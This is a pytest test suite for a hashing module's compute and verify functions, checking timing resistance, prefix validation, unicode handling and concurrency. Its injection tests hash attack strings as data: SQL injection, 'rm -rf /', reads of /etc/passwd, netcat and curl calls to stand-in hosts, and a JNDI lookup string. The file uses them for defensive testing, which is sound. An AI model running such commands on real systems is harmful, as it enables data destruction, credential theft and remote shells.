"""Comprehensive edge case and attack tests for spiritengine.hash

This test suite focuses on edge cases, security issues, and attack vectors
not fully covered in the main test_hash.py.

Categories:
- Timing attack resistance
- Injection and special character attacks
- Extreme input sizes
- Concurrent hashing
- Memory exhaustion attempts
- Hash string parsing edge cases
- Prefix validation comprehensive tests
"""

import pytest
import time
import statistics
from concurrent.futures import ThreadPoolExecutor
from spiritengine.hash import compute, verify, HashError


class TestTimingAttackResistance:
    """Verify constant-time comparison prevents timing attacks."""

    def test_verify_timing_independence_different_positions(self):
        """Timing should be constant regardless of where hash differs.

        If verify() leaks timing info, attacker could iteratively guess hash.
        Using hmac.compare_digest should prevent this.

        NOTE: This test verifies that hmac.compare_digest is used.
        Statistical timing tests are inherently noisy and system-dependent.
        The real protection comes from using hmac.compare_digest correctly.
        """
        correct_hash = compute("secret_data")

        # Create hashes that differ at different positions
        # All these should take similar time to reject
        digest = correct_hash.split(":")[-1]

        wrong_first_char = "sha256:0" + digest[1:]
        wrong_middle_char = "sha256:" + digest[:32] + "0" + digest[33:]
        wrong_last_char = "sha256:" + digest[:-1] + "0"

        timings = []
        for wrong_hash in [wrong_first_char, wrong_middle_char, wrong_last_char]:
            times = []
            for _ in range(5000):  # Many iterations to reduce noise
                start = time.perf_counter()
                verify("secret_data", wrong_hash)
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            # Use median instead of mean to reduce outlier impact
            timings.append(statistics.median(times))

        # Check that timing variance is reasonable
        # We can't be too strict due to OS scheduling, CPU throttling, etc.
        # What matters most is that we use hmac.compare_digest
        max_time = max(timings)
        min_time = min(timings)
        variance_ratio = (max_time - min_time) / min_time

        # Very lenient threshold - we're just checking no obvious early-exit
        # If this fails consistently, there might be a timing leak
        # But system noise can cause occasional failures
        assert variance_ratio < 1.0, \
            f"Timing varies suspiciously: {timings}, ratio={variance_ratio:.2f}"

    def test_verify_timing_independent_of_content_length(self):
        """Verify timing should not leak content length information."""
        short_content = "x"
        long_content = "x" * 10000

        short_hash = compute(short_content)
        long_hash = compute(long_content)

        # Time verifying wrong content against each hash
        short_times = []
        long_times = []

        for _ in range(50):
            start = time.perf_counter()
            verify("wrong", short_hash)
            short_times.append(time.perf_counter() - start)

            start = time.perf_counter()
            verify("wrong", long_hash)
            long_times.append(time.perf_counter() - start)

        # Mean times should be similar (hash comparison is constant-time)
        short_mean = statistics.mean(short_times)
        long_mean = statistics.mean(long_times)

        # Allow 30% variance (system noise)
        variance_ratio = abs(short_mean - long_mean) / max(short_mean, long_mean)
        assert variance_ratio < 0.3, \
            f"Timing leak: short={short_mean}, long={long_mean}"


class TestInjectionAndSpecialChars:
    """Test handling of special characters and injection attempts."""

    def test_sql_injection_chars_in_content(self):
        """Content with SQL injection patterns should hash safely."""
        sql_payloads = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM passwords--",
        ]
        for payload in sql_payloads:
            h = compute(payload)
            assert verify(payload, h)

    def test_command_injection_chars_in_content(self):
        """Content with shell metacharacters should hash safely."""
        shell_payloads = [
            "; rm -rf /",
            "$(whoami)",
            "`cat /etc/passwd`",
            "| nc attacker.com 1234",
            "&& curl evil.com",
        ]
        for payload in shell_payloads:
            h = compute(payload)
            assert verify(payload, h)

    def test_path_traversal_in_content(self):
        """Path traversal patterns in content."""
        paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
        ]
        for path in paths:
            h = compute(path)
            assert verify(path, h)

    def test_format_string_attacks_in_content(self):
        """Format string attack patterns."""
        formats = [
            "%s%s%s%s%s%s%s",
            "%x%x%x%x",
            "{0}{1}{2}",
            "${jndi:ldap://evil.com}",
        ]
        for fmt in formats:
            h = compute(fmt)
            assert verify(fmt, h)

    def test_control_characters_in_content(self):
        """All control characters (0x00-0x1F) should hash."""
        for i in range(32):
            char = chr(i)
            h = compute(f"test{char}data")
            assert verify(f"test{char}data", h)

    def test_all_ascii_printable(self):
        """All ASCII printable characters (32-126)."""
        for i in range(32, 127):
            char = chr(i)
            h = compute(char)
            assert verify(char, h)

    def test_unicode_categories(self):
        """Various unicode category samples."""
        samples = [
            "\u200b",  # Zero-width space
            "\u202e",  # Right-to-left override
            "\ufeff",  # Zero-width no-break space (BOM)
            "\u0000",  # Null character
            "\uffff",  # Highest BMP character
        ]
        for sample in samples:
            h = compute(sample)
            assert verify(sample, h)

    def test_homograph_attacks(self):
        """Unicode homograph characters (look similar, different bytes)."""
        # Cyrillic 'а' vs Latin 'a'
        cyrillic_a = "\u0430"  # Cyrillic
        latin_a = "a"  # Latin

        h1 = compute(cyrillic_a)
        h2 = compute(latin_a)

        # Should produce different hashes
        assert h1 != h2
        assert verify(cyrillic_a, h1)
        assert not verify(latin_a, h1)


class TestPrefixValidationComprehensive:
    """Exhaustive prefix validation tests."""

    def test_prefix_with_numbers_only(self):
        """Prefix can be all numbers."""
        h = compute("test", prefix="12345")
        assert h.startswith("12345:sha256:")

    def test_prefix_with_underscores_only(self):
        """Prefix can be all underscores."""
        h = compute("test", prefix="___")
        assert h.startswith("___:sha256:")

    def test_prefix_with_hyphens_only(self):
        """Prefix can be all hyphens."""
        h = compute("test", prefix="---")
        assert h.startswith("---:sha256:")

    def test_prefix_mixed_valid_chars(self):
        """Prefix with all valid character types."""
        h = compute("test", prefix="aZ09_-")
        assert h.startswith("aZ09_-:sha256:")

    def test_prefix_starting_with_number(self):
        """Prefix can start with number."""
        h = compute("test", prefix="9prefix")
        assert h.startswith("9prefix:sha256:")

    def test_prefix_starting_with_hyphen(self):
        """Prefix can start with hyphen."""
        h = compute("test", prefix="-prefix")
        assert h.startswith("-prefix:sha256:")

    def test_prefix_starting_with_underscore(self):
        """Prefix can start with underscore."""
        h = compute("test", prefix="_prefix")
        assert h.startswith("_prefix:sha256:")

    def test_prefix_with_dot_rejected(self):
        """Prefix with dot is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="my.prefix")

    def test_prefix_with_slash_rejected(self):
        """Prefix with slash is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="my/prefix")

    def test_prefix_with_backslash_rejected(self):
        """Prefix with backslash is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="my\\prefix")

    def test_prefix_with_at_sign_rejected(self):
        """Prefix with @ is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="my@prefix")

    def test_prefix_with_plus_rejected(self):
        """Prefix with + is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="my+prefix")

    def test_prefix_with_equals_rejected(self):
        """Prefix with = is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="my=prefix")

    def test_prefix_none_vs_empty_string(self):
        """None and empty string both result in no prefix."""
        h1 = compute("test", prefix=None)
        h2 = compute("test", prefix="")
        assert h1 == h2
        # Format without prefix is "sha256:digest" (2 parts)
        assert len(h1.split(":")) == 2
        assert h1.startswith("sha256:")

    def test_prefix_whitespace_only_rejected(self):
        """Prefix with only whitespace is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="   ")

    def test_prefix_with_tabs_rejected(self):
        """Prefix with tabs is rejected."""
        with pytest.raises(HashError):
            compute("test", prefix="pre\tfix")

    def test_prefix_non_string_types(self):
        """Non-string prefix types are rejected."""
        with pytest.raises(HashError):
            compute("test", prefix=123)
        with pytest.raises(HashError):
            compute("test", prefix=["prefix"])
        with pytest.raises(HashError):
            compute("test", prefix={"prefix": "value"})


class TestHashStringParsingEdgeCases:
    """Edge cases in hash string validation and parsing."""

    def test_verify_with_extra_colons_in_digest(self):
        """Hash string with colons embedded in digest is rejected."""
        with pytest.raises(HashError):
            verify("test", "sha256:abc:def")

    def test_verify_with_whitespace_in_hash(self):
        """Whitespace in hash string is rejected."""
        valid_hash = compute("test")

        # Leading whitespace
        with pytest.raises(HashError):
            verify("test", " " + valid_hash)

        # Trailing whitespace
        with pytest.raises(HashError):
            verify("test", valid_hash + " ")

        # Whitespace in middle
        parts = valid_hash.split(":")
        with pytest.raises(HashError):
            verify("test", f"{parts[0]} :{parts[1]}")

    def test_verify_empty_string_hash(self):
        """Empty string as hash is rejected."""
        with pytest.raises(HashError):
            verify("test", "")

    def test_verify_single_colon(self):
        """Single colon is invalid format."""
        with pytest.raises(HashError):
            verify("test", ":")

    def test_verify_only_algorithm(self):
        """Algorithm without digest is rejected."""
        with pytest.raises(HashError):
            verify("test", "sha256:")

    def test_verify_only_digest(self):
        """Digest without algorithm is rejected."""
        with pytest.raises(HashError):
            verify("test", ":" + "a" * 64)

    def test_verify_digest_too_long(self):
        """Digest longer than 64 chars is rejected."""
        with pytest.raises(HashError):
            verify("test", "sha256:" + "a" * 65)

    def test_verify_digest_too_short(self):
        """Digest shorter than 64 chars is rejected."""
        with pytest.raises(HashError):
            verify("test", "sha256:" + "a" * 63)

    def test_verify_digest_with_uppercase_mixed(self):
        """Digest with mixed case is rejected."""
        with pytest.raises(HashError):
            verify("test", "sha256:" + "aA" * 32)

    def test_verify_digest_with_non_hex(self):
        """Digest with non-hex chars is rejected."""
        invalid_chars = "ghijklmnopqrstuvwxyz"
        for char in invalid_chars:
            with pytest.raises(HashError):
                verify("test", "sha256:" + char * 64)

    def test_verify_algorithm_variations(self):
        """Only exact 'sha256' is accepted."""
        digest = "a" * 64

        # Uppercase
        with pytest.raises(HashError):
            verify("test", f"SHA256:{digest}")

        # Mixed case
        with pytest.raises(HashError):
            verify("test", f"Sha256:{digest}")

        # With spaces
        with pytest.raises(HashError):
            verify("test", f"sha 256:{digest}")

        # Different algorithms
        for algo in ["md5", "sha1", "sha512", "blake2b"]:
            with pytest.raises(HashError):
                verify("test", f"{algo}:{digest}")

    def test_verify_prefix_with_invalid_chars(self):
        """Prefix in hash string is validated when extracted."""
        digest = "a" * 64

        # Note: verify() extracts prefix but doesn't re-validate it
        # It just tries to compute with that prefix
        # These should fail when compute() is called internally
        invalid_prefixes = ["has space", "has:colon", "has\nnewline"]

        for prefix in invalid_prefixes:
            hash_str = f"{prefix}:sha256:{digest}"
            # This might fail in verify or might fail in compute
            # Either way it should not succeed
            with pytest.raises(HashError):
                verify("test", hash_str)


class TestExtremeInputSizes:
    """Test behavior with extreme input sizes."""

    def test_very_long_string(self):
        """String longer than typical buffer sizes."""
        sizes = [
            1_000_000,      # 1 MB
            10_000_000,     # 10 MB
            50_000_000,     # 50 MB (might be slow)
        ]

        for size in sizes:
            content = "x" * size
            h = compute(content)
            assert verify(content, h)
            assert h.startswith("sha256:")

    def test_empty_vs_single_char(self):
        """Boundary between empty and non-empty."""
        h_empty = compute("")
        h_single = compute("x")
        assert h_empty != h_single

    def test_repeated_pattern_different_lengths(self):
        """Same pattern, different repetitions."""
        pattern = "abc"
        hashes = []
        for i in range(1, 100):
            h = compute(pattern * i)
            hashes.append(h)

        # All should be unique
        assert len(set(hashes)) == len(hashes)

    def test_max_unicode_codepoint(self):
        """Highest valid unicode codepoint (U+10FFFF)."""
        # U+10FFFF is the highest valid unicode codepoint
        max_char = chr(0x10FFFF)
        h = compute(max_char)
        assert verify(max_char, h)

    def test_string_with_many_newlines(self):
        """String consisting mostly of newlines."""
        content = "\n" * 100000
        h = compute(content)
        assert verify(content, h)


class TestConcurrency:
    """Test thread safety and concurrent operations."""

    def test_concurrent_compute_same_input(self):
        """Multiple threads computing same input get same result."""
        content = "concurrent test data"

        def compute_hash():
            return compute(content)

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(compute_hash) for _ in range(100)]
            results = [f.result() for f in futures]

        # All results should be identical
        assert len(set(results)) == 1

    def test_concurrent_compute_different_inputs(self):
        """Multiple threads computing different inputs."""
        def compute_indexed(i):
            return compute(f"test-{i}")

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(compute_indexed, i) for i in range(100)]
            results = [f.result() for f in futures]

        # All results should be unique
        assert len(set(results)) == 100

    def test_concurrent_verify(self):
        """Multiple threads verifying same hash."""
        content = "verify test"
        hash_str = compute(content)

        def verify_hash():
            return verify(content, hash_str)

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(verify_hash) for _ in range(100)]
            results = [f.result() for f in futures]

        # All verifications should succeed
        assert all(results)


class TestHashCollisionResistance:
    """Test that similar inputs produce very different hashes."""

    def test_single_bit_change_in_utf8(self):
        """Flipping a single bit in UTF-8 encoding changes hash dramatically."""
        # 'A' = 0x41, 'B' = 0x42 (differ by one bit)
        h1 = compute("A")
        h2 = compute("B")

        d1 = h1.split(":")[-1]
        d2 = h2.split(":")[-1]

        # Count differing positions
        diff_count = sum(1 for a, b in zip(d1, d2) if a != b)

        # Should differ in most positions (avalanche effect)
        assert diff_count > 30

    def test_prefix_vs_suffix_same_chars(self):
        """Same characters in different positions produce different hashes."""
        h1 = compute("abc123")
        h2 = compute("123abc")
        assert h1 != h2

    def test_anagrams_different_hashes(self):
        """Anagrams produce different hashes."""
        h1 = compute("listen")
        h2 = compute("silent")
        assert h1 != h2

    def test_length_extension_resistance(self):
        """Adding characters to end changes hash completely."""
        base = "hello"
        extended = "hello world"

        h1 = compute(base)
        h2 = compute(extended)

        # Hashes should be completely different
        assert h1 != h2

        # Can't derive h2 from h1
        d1 = h1.split(":")[-1]
        d2 = h2.split(":")[-1]
        assert d1 not in d2


class TestErrorMessages:
    """Verify error messages are clear and informative."""

    def test_compute_non_string_error_message(self):
        """Error message explains the problem clearly."""
        try:
            compute(123)
            assert False, "Should have raised HashError"
        except HashError as e:
            # Should mention type mismatch
            assert "string" in str(e).lower()
            assert "int" in str(e).lower()

    def test_invalid_prefix_error_message(self):
        """Error message shows what's wrong with prefix."""
        try:
            compute("test", prefix="has space")
            assert False, "Should have raised HashError"
        except HashError as e:
            # Should show the invalid prefix
            assert "has space" in str(e)

    def test_invalid_hash_format_error_message(self):
        """Error message explains hash format issue."""
        try:
            verify("test", "not-a-hash")
            assert False, "Should have raised HashError"
        except HashError as e:
            # Should mention expected format
            assert "format" in str(e).lower()

    def test_wrong_algorithm_error_message(self):
        """Error message identifies unsupported algorithm."""
        try:
            verify("test", "md5:" + "a" * 64)
            assert False, "Should have raised HashError"
        except HashError as e:
            # Should mention the algorithm
            assert "md5" in str(e).lower()
            assert "sha256" in str(e).lower()


class TestBoundaryConditions:
    """Boundary value tests."""

    def test_prefix_length_boundaries(self):
        """Test prefix at various lengths."""
        for length in [1, 10, 50, 100, 255, 1000]:
            prefix = "x" * length
            h = compute("test", prefix=prefix)
            assert h.startswith(prefix + ":sha256:")
            assert verify("test", h)

    def test_content_at_power_of_two_lengths(self):
        """Content at power-of-two boundaries (common buffer sizes)."""
        for power in [0, 8, 16, 20]:  # Up to 1MB
            size = 2 ** power
            content = "x" * size
            h = compute(content)
            assert verify(content, h)

    def test_unicode_boundary_codepoints(self):
        """Unicode at category boundaries."""
        # Last ASCII char
        h1 = compute(chr(127))
        # First non-ASCII char
        h2 = compute(chr(128))
        assert h1 != h2

        # Last BMP char
        h3 = compute(chr(0xFFFF))
        # First supplementary char
        h4 = compute(chr(0x10000))
        assert h3 != h4


class TestRegressionPrevention:
    """Tests to prevent specific regression scenarios."""

    def test_prefix_extracted_correctly_for_verification(self):
        """Verify must extract prefix to compute correct comparison hash."""
        original = "test data"

        # With prefix
        h_with = compute(original, prefix="myns")
        assert verify(original, h_with)

        # Without prefix (should fail against prefixed hash)
        h_without = compute(original)
        assert h_with != h_without

        # Verify uses the prefix from the hash string
        assert verify(original, h_with)

    def test_compute_does_not_modify_input(self):
        """compute() should not modify input string (verify immutability)."""
        # In Python, strings are immutable, but good to document expectation
        original = "test data"
        original_copy = original

        compute(original)

        assert original is original_copy  # Same object
        assert original == "test data"  # Same value

    def test_hash_output_is_lowercase(self):
        """All hash outputs should be lowercase hex."""
        for _ in range(100):
            h = compute(f"test-{_}")
            digest = h.split(":")[-1]
            assert digest == digest.lower()
            assert digest.isalnum()  # No special chars

    def test_no_hash_collision_in_sample(self):
        """Sanity check: no collisions in reasonable sample."""
        hashes = set()
        for i in range(10000):
            h = compute(f"test-{i}")
            assert h not in hashes, f"Collision at {i}"
            hashes.add(h)
